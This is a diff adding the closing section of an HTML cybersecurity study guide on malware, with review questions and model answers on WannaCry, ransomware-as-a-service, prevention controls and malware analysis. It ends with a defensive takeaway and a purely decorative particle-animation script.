+          <tr><td>Q7</td><td>How does WannaCry differ from traditional ransomware? What vulnerability enabled its rapid spread?</td><td>5</td><td>Ransomworm=worm propagation + ransomware payload; EternalBlue/SMBv1 MS17-010</td></tr>
+          <tr><td>Q8</td><td>List five malware prevention controls. Explain which specific threat each prevents.</td><td>10</td><td>Patching (worms), MFA (credentials), backups (ransomware), email sandbox (Trojans), EDR (fileless)</td></tr>
+          <tr><td>Q9</td><td>What is Ransomware-as-a-Service (RaaS)? How does the affiliate model work?</td><td>4</td><td>Criminal group develops ransomware; leases to affiliates; 20-30% cut; lowered skill barrier</td></tr>
+          <tr><td>Q10</td><td>Describe two types of malware analysis. What is an Indicator of Compromise (IoC)?</td><td>6</td><td>Static (no exec, hash/strings/disassembly); Dynamic (sandbox, behaviour); IoC=evidence of infection (hash, IP, domain)</td></tr>
+        </tbody>
+      </table></div>
+    </div>
+    <div class="pills">
+      <span class="pill">🪱 Patch = kills worms</span>
+      <span class="pill a">💾 Immutable backups = ransomware immunity</span>
+      <span class="pill o">🎭 Trojans rely on deception</span>
+      <span class="pill i">👁️ EDR catches what AV misses</span>
+      <span class="pill g">🔐 MFA = credential theft mitigation</span>
+      <span class="pill">☠️ NotPetya = most costly malware ever</span>
+      <span class="pill a">🎯 APT dwell time = 21+ days</span>
+      <span class="pill r">🏭 Supply chain = critical vector</span>
+    </div>
+    <div class="concl"><div class="cl">📌 Unit 5 Final Takeaway</div>
+      <p>Malware is not a technical problem — it's a business problem that requires a technical response. Ransomware groups operate like companies with HR departments, affiliate programmes, and customer service. APTs are funded by nation-states with unlimited resources. The defender's advantage is not superior technology — it's speed of detection, depth of visibility, and the ability to contain an incident before it becomes a catastrophe. <strong>Assume breach. Detect fast. Contain faster.</strong></p>
+    </div>
+  </div>
+</div>
+
+<div style="text-align:center;padding:40px 0 60px;opacity:.28;font-family:'Share Tech Mono',monospace;font-size:.7rem;color:#601020;letter-spacing:2px;">
+  UNIT 5 // MALWARE &amp; CYBER THREATS // TOPICS 73–88 // COMPLETE STUDY GUIDE
+</div>
+</div>
+
+<script>
+// Animated threat particles
+const canvas = document.getElementById('bg');
+const ctx = canvas.getContext('2d');
+canvas.width = window.innerWidth;
+canvas.height = window.innerHeight;
+
+const chars = '01DEADBEEF MALWARE VIRUS WORM 4F4E4F4646 C2 BOTNET RAT RANSOM '.split('');
+const particles = [];
+
+for(let i = 0; i < 70; i++){
+  particles.push({
+    x: Math.random() * canvas.width,
+    y: Math.random() * canvas.height,
+    vx: (Math.random()-0.5)*0.5,
+    vy: (Math.random()-0.5)*0.5,
+    char: chars[Math.floor(Math.random()*chars.length)],
+    size: Math.random()*4+8,
+    alpha: Math.random()*0.15+0.03,
+    color: Math.random()>.6?'#ff2244':Math.random()>.5?'#aaff00':'#ff6622'
+  });
+}
+
+function animate(){
+  ctx.clearRect(0,0,canvas.width,canvas.height);
+  particles.forEach(p=>{
+    p.x+=p.vx; p.y+=p.vy;
+    if(p.x<0||p.x>canvas.width)p.vx*=-1;
+    if(p.y<0||p.y>canvas.height)p.vy*=-1;
+    ctx.globalAlpha=p.alpha;
+    ctx.fillStyle=p.color;
+    ctx.font=`${p.size}px 'Share Tech Mono',monospace`;
+    ctx.fillText(p.char,p.x,p.y);
+    if(Math.random()<0.01)p.char=chars[Math.floor(Math.random()*chars.length)];
+  });
+  // draw connections
+  for(let i=0;i<particles.length;i++){
+    for(let j=i+1;j<particles.length;j++){
+      const dx=particles[i].x-particles[j].x,dy=particles[i].y-particles[j].y;
+      const d=Math.sqrt(dx*dx+dy*dy);
+      if(d<90){ctx.beginPath();ctx.moveTo(particles[i].x,particles[i].y);
+        ctx.lineTo(particles[j].x,particles[j].y);
+        ctx.strokeStyle='#ff2244';ctx.globalAlpha=(1-d/90)*0.06;ctx.lineWidth=0.5;ctx.stroke();}
+    }
+  }
+  ctx.globalAlpha=1;
+  requestAnimationFrame(animate);
+}
+animate();
+
+window.addEventListener('resize',()=>{canvas.width=window.innerWidth;canvas.height=window.innerHeight;});
+document.querySelectorAll('a[href^="#"]').forEach(a=>{
+  a.addEventListener('click',e=>{e.preventDefault();
+    const t=document.querySelector(a.getAttribute('href'));
+    if(t)t.scrollIntoView({behavior:'smooth',block:'start'});
+  });
+});
+</script>
+</body>
+</html>
